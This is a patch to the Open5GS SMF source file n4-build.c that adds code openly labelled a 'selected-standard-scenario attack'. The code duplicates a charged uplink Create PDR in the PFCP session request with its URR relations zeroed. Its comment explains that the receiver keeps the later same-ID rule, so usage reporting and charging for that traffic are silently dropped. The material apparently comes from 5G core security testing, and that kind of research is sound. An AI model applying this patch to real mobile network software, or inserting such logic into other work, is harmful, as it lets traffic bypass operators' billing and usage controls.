@@ -1,0 +1,35 @@
+--- a/src/smf/n4-build.c
++++ b/src/smf/n4-build.c
+@@ -88,6 +88,32 @@
+         i++;
+     }
+ 
++    /*
++     * selected-standard-scenario attack: repeat the charged uplink Create PDR with the same
++     * identity and forwarding semantics, but without its URR relation.
++     * The receiver applies same-ID Create PDRs in wire order, so the
++     * duplicate becomes the installed relation graph.
++     */
++    ogs_list_for_each(&sess->pfcp.pdr_list, pdr) {
++        int j;
++
++        if (pdr->src_if != OGS_PFCP_INTERFACE_ACCESS ||
++            pdr->num_of_urr == 0)
++            continue;
++
++        ogs_assert(i < OGS_ARRAY_SIZE(req->create_pdr));
++        ogs_pfcp_build_create_pdr(&req->create_pdr[i], i, pdr);
++        for (j = 0; j < OGS_ARRAY_SIZE(req->create_pdr[i].urr_id); j++)
++            memset(&req->create_pdr[i].urr_id[j], 0,
++                    sizeof(req->create_pdr[i].urr_id[j]));
++
++        ogs_warn("selected-standard-scenario attack duplicated Create PDR id[%u] "
++                "without URR relation at index[%d]",
++                pdr->id, i);
++        i++;
++        break;
++    }
++
+     /* Create FAR */
+     i = 0;
+     ogs_list_for_each(&sess->pfcp.far_list, far) {
